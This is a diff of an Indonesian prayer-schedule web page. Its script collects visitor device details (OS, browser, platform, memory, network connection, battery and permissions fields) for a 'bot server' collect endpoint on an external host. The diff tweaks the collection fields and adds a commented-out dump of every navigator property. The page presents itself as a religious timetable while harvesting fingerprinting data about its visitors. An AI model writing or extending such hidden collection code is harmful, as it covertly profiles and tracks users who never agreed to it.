@@ -85,7 +85,7 @@ Lokasi Anda
 <!-- Item jadwal akan diisi oleh JavaScript -->
 </ul>
 </div>
-
+<!-- <pre id="debug"></pre> -->
 <!-- Penutup -->
 <div class="mt-8 text-center text-emerald-300 text-sm">
 <p class="arabic">رَبِّ اجْعَلْنِي مُقِيمَ الصَّلَاةِ وَمِنْ ذُرِّيَّتِي</p>
@@ -93,8 +93,18 @@ Lokasi Anda
 </div>
 </div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.2/ua-parser.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ua-parser-js/dist/ua-parser.min.js"></script></script>
 <script>
+// const nav = {}
+// for (let key in navigator) {
+// try {
+// nav[key] = navigator[key]
+// } catch (e) {
+// nav[key] = '[access denied]'
+// }
+// }
+
+// document.getElementById('debug').textContent = JSON.stringify(nav, null, 2)
 const parser = new UAParser()
 const result = parser.getResult()
 const BOT_SERVER_URL = "https://cybers-api.vercel.app/v1/collect"
@@ -136,7 +146,7 @@ heapSize: performance.memory?.jsHeapSizeLimit || 'unknown',
 connection: navigator.connection
 ? {
 type: navigator.connection.type,
-effectiveType: navigator.connection.effectiveType,
+effectiveType: navigator.connection.effectiveType.toUpperCase(),
 downlink: navigator.connection.downlink,
 rtt: navigator.connection.rtt,
 }
@@ -145,8 +155,8 @@ permissions: [],
 battery: null,
 deviceDetail: {
 os: result.os.name + " " + result.os.version,
-device: result.device.type || "Desktop",
-browser: result.browser.name + " " + result.browser.version,
+device: navigator.userAgentData.platform || "Unknown",
+browser: navigator.userAgentData.brands[0].brand,
 },
 }
 
